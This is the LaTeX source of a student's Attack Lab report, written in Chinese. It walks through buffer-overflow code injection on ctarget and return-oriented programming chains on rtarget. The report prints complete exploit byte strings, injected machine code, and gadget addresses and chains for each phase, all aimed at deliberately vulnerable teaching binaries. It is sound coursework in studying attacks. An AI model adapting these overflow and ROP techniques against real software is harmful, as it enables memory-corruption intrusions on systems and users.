\documentclass[12pt,a4paper]{article}
\usepackage[margin=2cm, top=2.5cm, bottom=3cm]{geometry}
\usepackage{ctex}
\usepackage{graphicx}
\usepackage{enumitem}
\usepackage{multirow}
\usepackage{booktabs}
\usepackage{hyperref}
\usepackage{tabularx}

% 配置图表编号格式
\graphicspath{{figures/}} % 图表文件存放路径
\renewcommand{\figurename}{图}
\renewcommand{\tablename}{表}

% 文档标题设置
\title{计算机组成原理 Attack Lab 实验报告}
\author{学号:2023010304\quad 姓名:李孙木铎\quad 班级:软件31}
\date{\today}

\begin{document}
\maketitle
% \tableofcontents % 生成目录
% \newpage

\section{实验概述}
\subsection{实验背景与目的}
\paragraph{背景说明}
Attack Lab 围绕缓冲区溢出漏洞展开,通过对两个存在安全缺陷的可执行程序(\texttt{ctarget} 和 \texttt{rtarget})设计攻击输入,理解攻击者利用漏洞的原理,同时掌握程序运行时栈结构、指令编码及系统安全防护机制。

\paragraph{实验目标}
\begin{enumerate}[label=(\arabic*)]
    \item 深入理解 x86-64 架构下栈结构与函数调用参数传递机制;
    \item 掌握代码注入(Code Injection, CI)攻击的原理与实现方法;
    \item 掌握返回导向编程(Return-Oriented Programming, ROP)攻击的原理与实现方法;
    \item 熟悉调试工具(GDB、OBJDUMP)的使用;
    \item 理解编译器与操作系统的安全防护机制(如栈随机化、栈不可执行)。
\end{enumerate}

\subsection{实验环境与工具}
\subsubsection{环境配置}
\begin{itemize}
    \item 操作系统:\underline{x86-64 Ubuntu 22.04}(也即助教提供的虚拟机环境)
    \item 目标程序:\texttt{ctarget}, \texttt{rtarget} 两个可执行文件
\end{itemize}

\subsubsection{核心工具}
\begin{table}[htbp]
    \centering
    \small % 缩小字体
    \begin{tabular}{@{}lll@{}}
        \toprule
        工具名称 & 用途 & 关键命令示例 \\
        \midrule
        \texttt{OBJDUMP} & 反汇编可执行文件 & \verb|objdump -d ctarget > ctarget_disasm.s| \\
        \texttt{GDB} & 程序调试、查看寄存器 & \texttt{gdb ./ctarget}、\texttt{break *0x8089fd} \\
        \texttt{HEX2RAW} & 将攻击字符串转为字节流 & \verb|./hex2raw < exploit.txt > exploit_raw.txt| \\
        \bottomrule
    \end{tabular}
    \caption{实验核心工具说明}
    \label{tab:tools}
\end{table}

\subsection{实验文件说明}
从 \url{http://nuc.kirotta.top:15513/} 获取的 \texttt{targetk.tar} 解压后包含以下文件:
\begin{itemize}
    \item \texttt{README.txt}:目录文件说明;
    \item \texttt{ctarget}:存在代码注入漏洞的可执行程序;
    \item \texttt{rtarget}:存在 ROP 漏洞的可执行程序;
    \item \texttt{cookie.txt}:个人专属 8 位十六进制标识(攻击参数核心);
    \item \texttt{farm.c}:ROP 攻击所需的“gadget 农场”源代码;
    \item \texttt{hex2raw}:攻击字符串转换工具。
\end{itemize}

\subsection{实验任务总览}
实验分为 5 个阶段,其中前 4 个阶段计分,第 5 阶段为可选任务:
% \begin{table}[htbp]
%     \centering
%     \begin{tabular}{|c|c|c|c|c|c|}
%         \hline
%         阶段 & 目标程序 & 攻击类型 & 目标函数 & 核心要求 & 分值 \\
%         \hline
%         1 & \texttt{ctarget} & 代码注入(CI) & \texttt{touch1} & 重定向返回地址至 \texttt{touch1} & 10 \\
%         \hline
%         2 & \texttt{ctarget} & 代码注入(CI) & \texttt{touch2} & 传递 \texttt{cookie} 作为参数 & 25 \\
%         \hline
%         3 & \texttt{ctarget} & 代码注入(CI) & \texttt{touch3} & 传递 \texttt{cookie} 字符串地址作为参数 & 25 \\
%         \hline
%         4 & \texttt{rtarget} & 返回导向编程(ROP) & \texttt{touch2} & 用 gadget 传递 \texttt{cookie} 参数 & 35 \\
%         \hline
%         5(可选) & \texttt{rtarget} & 返回导向编程(ROP) & \texttt{touch3} & 用 gadget 传递 \texttt{cookie} 字符串地址 & 0 \\
%         \hline
%     \end{tabular}
%     \caption{实验任务与分值分布}
%     \label{tab:tasks}
% \end{table}

\begin{table}[htbp]
    \centering
    \small % 缩小字体
    \begin{tabular}{@{}lllllp{1cm}@{}}
        \toprule
        阶段 & 目标程序 & 攻击类型 & 目标函数 & 核心要求 & 分值 \\
        \midrule
        1 & \texttt{ctarget} & 代码注入(CI) & \texttt{touch1} & 重定向返回地址至 \texttt{touch1} & 10 \\
        2 & \texttt{ctarget} & 代码注入(CI) & \texttt{touch2} & 传递 \texttt{cookie} 作为参数 & 25 \\
        3 & \texttt{ctarget} & 代码注入(CI) & \texttt{touch3} & 传递 \texttt{cookie} 字符串地址作为参数 & 25 \\
        4 & \texttt{rtarget} & 返回导向编程(ROP) & \texttt{touch2} & 用 gadget 传递 \texttt{cookie} 参数 & 35 \\
        5(可选) & \texttt{rtarget} & 返回导向编程(ROP) & \texttt{touch3} & 用 gadget 传递 \texttt{cookie} 字符串地址 & 0 \\
        \bottomrule
    \end{tabular}
    \caption{实验任务与分值分布}
    \label{tab:tasks}
\end{table}

\newpage
\section{代码注入攻击(针对 ctarget)}
\subsection{阶段 1:跳转至 touch1 函数}
\subsubsection{实验原理}
\paragraph{函数调用栈结构}
\texttt{getbuf} 由 \texttt{test} 函数调用,正常执行流程为:\texttt{test -> getbuf -> ret 回到 test}。
由于代码中使用了没有缓冲区边界检查的 \texttt{Gets} 函数读取用户输入,攻击者可通过构造超长输入覆盖 \texttt{getbuf} 栈帧中的“返回地址”。
本次攻击需修改 \texttt{getbuf} 返回时的栈中“返回地址”,使其指向 \texttt{touch1} 函数入口地址。

\paragraph{关键问题}
\begin{enumerate}[label=(\arabic*)]
    \item 确定 \texttt{getbuf} 中缓冲区 \texttt{buf} 的大小(\texttt{BUFFER\_SIZE});
    \item 确定栈中“返回地址”相对于 \texttt{buf} 的偏移量;
    \item 获取 \texttt{touch1} 函数的入口地址。
\end{enumerate}

\subsubsection{实验步骤}
\begin{enumerate}[label=(\arabic*)]
    \item 反汇编源程序\texttt{ctarget},分析 \texttt{getbuf} 函数栈帧结构,确定 \texttt{BUFFER\_SIZE} 及返回地址偏移量;
    \item 找到 \texttt{touch1} 函数入口地址;
    \item 构造攻击字符串:填充字节 + \texttt{touch1} 入口地址(小端序);
    \item 使用 \texttt{hex2raw} 转换攻击字符串为字节流,测试攻击效果。
\end{enumerate}

\subsubsection{攻击字符串设计}
\begin{verbatim}
30 31 32 33 34 35 36 37 38 39
30 31 32 33 34 35 36 37 38 39
30 31 32 33 34 35 36 37 38 39
30 31 32 33 34 35 36 37 38 39  # 填充字节(BUFFER_SIZE=40)
fe 89 80  # touch1 地址(小端序)
\end{verbatim}

\subsubsection{实验结果与验证}
\paragraph{执行命令}
\texttt{./hex2raw < ctarget01.txt | ./ctarget}

\paragraph{预期输出}
\begin{verbatim}
Cookie: 0x3cc11c77
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Sent exploit string to server to be validated.
NICE JOB!
\end{verbatim}

\paragraph{实际结果与问题分析}
实际代码顺利执行,成功跳转至 \texttt{touch1} 函数,验证攻击字符串设计正确。

\subsection{阶段 2:跳转至 touch2 函数(传递 cookie 参数)}
\subsubsection{实验原理}
\paragraph{参数传递规则}
x86-64 架构下,函数第一个参数通过 \%rdi 寄存器传递。攻击需在栈中注入自定义汇编代码,将 \texttt{cookie} 加载到 \%rdi;
之后修改 \texttt{getbuf} 返回地址,使其先跳至注入代码,再由注入代码跳至 \texttt{touch2}。

\paragraph{核心汇编指令设计}
需实现:\texttt{mov \$cookie, \%rdi; ret;}(将 cookie 存入 \%rdi,再跳至 \texttt{touch2})。

\subsubsection{实验步骤}
\begin{enumerate}
    \item 反汇编 \texttt{ctarget},确定 \texttt{buf} 地址与返回地址偏移;
    \item 编写汇编代码,使用汇编和反汇编工具生成对应机器码;
    \item 使用GDB调试,确定注入代码在栈中的地址(即 \texttt{\%rsp} 的值);
    \item 构造攻击字符串:注入代码 + 填充字节 + 注入代码地址 + \texttt{touch2} 地址;
\end{enumerate}

\subsubsection{攻击字符串设计}
\paragraph{字符串结构}
\begin{verbatim}
48 c7 c7 77 1c c1 3c c3  # 注入汇编代码:mov $0x3cc11c77, %rdi; ret;
38 39
30 31 32 33 34 35 36 37 38 39
30 31 32 33 34 35 36 37 38 39
30 31 32 33 34 35 36 37 38 39  # 填充字节(覆盖 getbuf 栈帧至返回地址)
48 d1 63 55 00 00 00 00  # 注入代码地址(即 buf 起始地址,小端序)
fd 89 80 00 00 00 00 00  # 对齐用地址,对应于汇编代码中某条 ret 语句
2c 8a 80 00 00 00 00 00  # touch2 入口地址(小端序)
\end{verbatim}

\subsubsection{实验结果与验证}
\paragraph{执行命令}
\texttt{./hex2raw < ctarget02.txt | ./ctarget}

\paragraph{预期输出}
\begin{verbatim}
Cookie: 0x3cc11c77
Type string:Touch2!: You called touch2(0x3cc11c77)
Valid solution for level 2 with target ctarget
PASS: Sent exploit string to server to be validated.
NICE JOB!
\end{verbatim}

\paragraph{实际结果与问题分析}
\begin{itemize}
    \item 最开始设计时,没有使用对齐地址编码,导致注入代码执行后跳转正常(且参数正常传递),
    但最后代码没有正常退出,而是以段错误结束。
    \item 经查阅资料,得知:在x86-64架构下,函数调用后栈需保持16字节对齐,否则可能引发段错误。
    此处,若没有一个对应于 \texttt{ret} 指令的对齐地址,栈将无法保持对齐状态。增加后,代码正常结束退出。
\end{itemize}


\subsection{阶段 3:跳转至 touch3 函数(传递 cookie 字符串参数)}
\subsubsection{实验原理}
\paragraph{参数要求}
\texttt{touch3} 需接收指向 \texttt{cookie} 字符串(8 位 hex + 末尾 null 字节)的地址作为参数。
因此,需要将字符串存入栈中,且避免被 \texttt{hexmatch} 等函数调用时的栈操作覆盖;
同时,注入代码需将字符串地址加载到 \%rdi,再跳至 \texttt{touch3}。

\paragraph{字符串存储位置选择}
将字符串存于栈的开头(\texttt{buf} 起始地址处),避免被后续函数调用覆盖。

\subsubsection{实验步骤}
\begin{enumerate}
    \item 反汇编 \texttt{ctarget},确定 \texttt{buf} 地址与返回地址偏移;
    \item 编写汇编代码,使用汇编和反汇编工具生成对应机器码;
    \item 使用GDB调试,确定注入代码在栈中的地址(即 \texttt{\%rsp} 的值);
    \item 构造攻击字符串:cookie 字符串 + 注入代码 + 填充字节 + 注入代码地址 + \texttt{touch3} 地址;
\end{enumerate}

\subsubsection{攻击字符串设计}
\paragraph{字符串结构}
\begin{verbatim}
33 63 63 31 31 63 37 37 00  # cookie 字符串 "3cc11c77" + null 终止符
48 c7 c7 48 d1 63 55 c3  # 注入代码
37 38 39
30 31 32 33 34 35 36 37 38 39
30 31 32 33 34 35 36 37 38 39  # 填充字节(覆盖 getbuf 栈帧至返回地址)
51 d1 63 55 00 00 00 00  # 注入代码地址(即 buf 起始地址,小端序)
fd 89 80 00 00 00 00 00  # 对齐用地址
43 8b 80 00 00 00 00 00  # touch3 入口地址(小端序)
\end{verbatim}

\subsubsection{实验结果与验证}
\paragraph{执行命令}
\texttt{./hex2raw < ctarget03.txt | ./ctarget}

\paragraph{预期输出}
\begin{verbatim}
Cookie: 0x3cc11c77
Type string:Touch3!: You called touch3("3cc11c77")
Valid solution for level 3 with target ctarget
PASS: Sent exploit string to server to be validated.
NICE JOB!
\end{verbatim}

\paragraph{实际结果与问题分析}
实际代码顺利执行,成功跳转至 \texttt{touch3} 函数,并传入正确的字符串地址,验证攻击字符串设计正确。


\newpage
\section{返回导向攻击(针对 rtarget)}
\subsection{阶段 2:ROP 攻击 touch2 函数(传递 cookie 参数)}
\subsubsection{实验原理}
\paragraph{RTARGET 安全机制}
\texttt{rtarget} 启用栈随机化与栈不可执行,代码注入攻击失效。需通过“gadget”(现有代码中“指令序列 + ret”)串联执行,将 \texttt{cookie} 存入 \texttt{\%rdi} 并跳至 \texttt{touch2}。

\paragraph{Gadget 需求}
需两类 gadget:
\begin{enumerate}
    \item \texttt{popq}指令:从栈中弹出数值至寄存器,这样,我们可以通过向栈注入数值,并将数值加载到寄存器中。
    \item \texttt{movq}指令:将寄存器中的数值存入另一个寄存器,这样,我们可以将注入的数值从其他寄存器转移至 \texttt{\%rdi} 从而传递参数。
\end{enumerate}

\subsubsection{实验步骤}
\begin{enumerate}
    \item 反汇编 \texttt{rtarget} 程序;
    \item 观察在 \texttt{start\_farm} 与 \texttt{mid\_farm} 之间的代码,对照机器码-汇编指令表,寻找所需的 gadget 及其入口地址;
    \item 确定 \texttt{getbuf} 栈帧结构,构造攻击字符串;
    \item 使用 \texttt{hex2raw} 转换攻击字符串为字节流,测试攻击效果。
\end{enumerate}

\subsubsection{攻击字符串(ROP 链)设计}
\paragraph{Gadget 信息表}
\begin{table}[htbp]
    \centering
    \begin{tabular}{|c|c|c|c|}
        \hline
        Gadget 功能 & 指令序列 & 入口地址(hex) & 机器码(hex) \\
        \hline
        从栈中弹出数值到寄存器 & \texttt{popq \%rax; nop; retq} & \texttt{808bfd} & \texttt{58 90 c3} \\
        \hline
        搬运寄存器的值 & \texttt{movq \%rax, \%rdi; nop; retq} & \texttt{808bee} & \texttt{48 89 c7 90 c3}\\
        \hline
    \end{tabular}
    \caption{ROP 攻击所用 Gadget 信息}
    \label{tab:gadgets}
\end{table}

\paragraph{字符串结构}
\begin{verbatim}
30 31 32 33 34 35 36 37 38 39
30 31 32 33 34 35 36 37 38 39
30 31 32 33 34 35 36 37 38 39
30 31 32 33 34 35 36 37 38 39 # 填充字节
fd 8b 80 00 00 00 00 00 # popq 指令的 gadget 地址
77 1c c1 3c 00 00 00 00 # cookie 数值
ee 8b 80 00 00 00 00 00 # movq 指令的 gadget 地址
2c 8a 80 00 00 00 00 00 # touch2 入口地址
\end{verbatim}

\subsubsection{实验结果与验证}
\paragraph{执行命令}
\texttt{./hex2raw < rtarget02.txt | ./rtarget}

\paragraph{预期输出}
\begin{verbatim}
Cookie: 0x3cc11c77
Type string:Touch2!: You called touch2(0x3cc11c77)
Valid solution for level 2 with target rtarget
PASS: Sent exploit string to server to be validated.
NICE JOB!
\end{verbatim}

\paragraph{实际结果与问题分析}
实际代码顺利执行,成功跳转至 \texttt{touch2} 函数,并传入正确的参数,验证 ROP 链设计正确。

\subsection{阶段 3:ROP 攻击 touch3 函数}
\subsubsection{实验原理}
\paragraph{核心挑战}
需传递 cookie 字符串地址至 \%rdi,需解决两个问题:
\begin{enumerate}
    \item 栈随机化导致字符串绝对地址不可预测,需利用 \%rsp 相对地址计算字符串地址;
    \item 由于gadget数量有限,需更复杂的地址计算与寄存器中转。
\end{enumerate}

\subsubsection{实验步骤}
\begin{enumerate}
    \item 反汇编 \texttt{rtarget} 程序;
    \item 观察在 \texttt{start\_farm} 与 \texttt{end\_farm} 之间的代码,对照机器码-汇编指令表,寻找所需的 gadget 及其入口地址;
    \item 设计 ROP 链,实现以下功能:
    \begin{enumerate}[label=(\alph*)]
        \item 可以将栈指针 \%rsp 的值加载到某个寄存器中(如 \%rax);
        \item 可以对寄存器的值进行加法运算,得到偏移后的字符串地址;
    \end{enumerate}
    \item 确定 \texttt{getbuf} 栈帧结构,构造攻击字符串;
    \item 使用 \texttt{hex2raw} 转换攻击字符串为字节流,测试攻击效果。
\end{enumerate}

\subsubsection{攻击字符串设计}
\paragraph{Gadget 信息表}
% \begin{table}[htbp]
%     \centering
%     \begin{tabular}{|c|c|c|c|}
%         \hline
%         Gadget 功能 & 指令序列 & 入口地址(hex) & 机器码(hex) \\
%         \hline
%         从栈中弹出数值到寄存器 & \texttt{popq \%rax; nop; retq} & \texttt{808bfd} & \texttt{58 90 c3} \\
%         \hline
%         搬运寄存器的值 & \texttt{movq \%rax, \%rdi; nop; retq} & \texttt{808bee} & \texttt{48 89 c7 90 c3}\\
%         \hline
%     \end{tabular}
%     \caption{ROP 攻击所用 Gadget 信息}
%     \label{tab:gadgets}
% \end{table}
\begin{table}[htbp]
    \centering
    \begin{tabular}{|p{3.5cm}|p{5.5cm}|p{1.8cm}|p{3.5cm}|}
        \hline
        Gadget 功能 & 指令序列 & 入口地址(hex) & 机器码(hex) \\
        \hline
        将栈基址加载到 \texttt{\%rax} & \texttt{movq \%rsp, \%rax; retq} & \texttt{808c34} & \texttt{48 89 e0 c3} \\
        \hline
        将 \texttt{\%rax} 移动到 \texttt{\%rdi} & \texttt{movq \%rax \%rdi; nop; retq} & \texttt{808bee} & \texttt{48 89 c7 90 c3} \\
        \hline
        从栈中弹出数值到 \texttt{\%rax} & \texttt{popq \%rax; nop; retq} & \texttt{808bfd} & \texttt{58 90 c3} \\
        \hline
        设置偏移:将 \texttt{\%eax} 移动到 \texttt{\%edx} & \texttt{movl \%eax, \%edx; nop; nop; retq} & \texttt{808ccf} & \texttt{89 c2 90 90 c3} \\
        \hline
        将 \texttt{\%edx} 移动到 \texttt{\%ecx} & \texttt{movl \%edx, \%ecx; nop; retq} & \texttt{808c47} & \texttt{89 d1 90 c3} \\
        \hline
        将 \texttt{\%ecx} 移动到 \texttt{\%esi} & \texttt{movl \%ecx, \%esi; nop; nop; retq} & \texttt{808ce9} & \texttt{89 ce 90 90 c3} \\
        \hline
        计算地址:\texttt{\%rax = \%rdi + \%rsi} & \texttt{lea (\%rdi,\%rsi,1), \%rax; retq} & \texttt{808c20} & \texttt{48 8d 04 37 c3} \\
        \hline
        将 \texttt{\%rax} 写入 \texttt{\%rdi} & \texttt{movq \%rax, \%rdi; nop; retq} & \texttt{808bee} & \texttt{48 89 c7 90 c3} \\
        \hline
    \end{tabular}
    \caption{用于阶段3(touch3)的 ROP gadget 列表(根据 rtarget\_3.txt 提取)}
    \label{tab:gadgets}
\end{table}


\paragraph{字符串结构}
\begin{verbatim}
30 31 32 33 34 35 36 37 38 39
30 31 32 33 34 35 36 37 38 39
30 31 32 33 34 35 36 37 38 39
30 31 32 33 34 35 36 37 38 39 # 填充字节
34 8c 80 00 00 00 00 00 # movq %rsp 指令的 gadget 地址
ee 8b 80 00 00 00 00 00 # 将 %rsp 值设定到目标寄存器的 gadget 地址
fd 8b 80 00 00 00 00 00 # popq 指令的 gadget 地址
48 00 00 00 00 00 00 00 # 偏移值(字符串相对于 %rsp 的偏移量,以16进制表示)
cf 8c 80 00 00 00 00 00
47 8c 80 00 00 00 00 00
e9 8c 80 00 00 00 00 00 # 将偏移值设定到目标寄存器的 gadget 地址
20 8c 80 00 00 00 00 00 # 加法运算指令的 gadget 地址
ee 8b 80 00 00 00 00 00 # 将计算结果设定到 %rdi 的 gadget 地址
43 8b 80 00 00 00 00 00 # touch3 入口地址(小端序)
33 63 63 31 31 63 37 37 00 # cookie 字符串 "3cc11c77" + null 终止符
\end{verbatim}

\subsubsection{实验结果与验证}
\paragraph{执行命令}
\texttt{./hex2raw < rtarget03.txt | ./rtarget}
\paragraph{预期输出}
\begin{verbatim}
Cookie: 0x3cc11c77
Type string:Touch3!: You called touch3("3cc11c77")
Valid solution for level 3 with target rtarget
PASS: Sent exploit string to server to be validated.
NICE JOB!
\end{verbatim}

\paragraph{实际结果与问题分析}
\begin{enumerate}
    \item 初始对栈偏移量计算错误,导致传递的字符串地址不正确,函数无法正确读取参数,最终以段错误结束。
    \item 通过 GDB 调试,逐步确认栈指针寄存器以及其他各寄存器的值,重新计算偏移量。
    \item 最终,调整偏移量后,成功传递正确字符串地址,函数正常执行并传入正确参数。
\end{enumerate}

\newpage
\section{实验总结与反思}
\subsection{实验收获}
\begin{enumerate}
    \item 通过阅读机器码与汇编指令,深入理解了 x86-64 架构下的各个基本指令的含义和格式,并对机器编码有基本认识;
    \item 通过实施代码注入攻击,理解了函数调用栈结构、参数传递机制及缓冲区溢出漏洞的利用方法;
    \item 通过实施返回值导向攻击,理解了栈随机化与栈不可执行等安全防护机制的作用与局限性;
    同时了解了 ROP 攻击的原理与实现方法,对计算机的过程调用机制有更深刻的认识;
    \item 熟练掌握了 GDB、OBJDUMP 等调试与反汇编工具的使用方法,提高了调试与逆向分析能力。
\end{enumerate}

\subsection{实验反思}
\begin{enumerate}
    \item 初始对过程调用的细节不熟悉(如每个指令对应的字节数,计算机中程序指令的结构等),导致花费大量时间在调试上;
    \item 对GDB等调试工具的使用不够熟练,初期调试效率较低;
    \item 对ROP攻击的理解不够深入,初期设计ROP链时遇到较大困难,需反复查阅资料与调试验证。
\end{enumerate}

\end{document}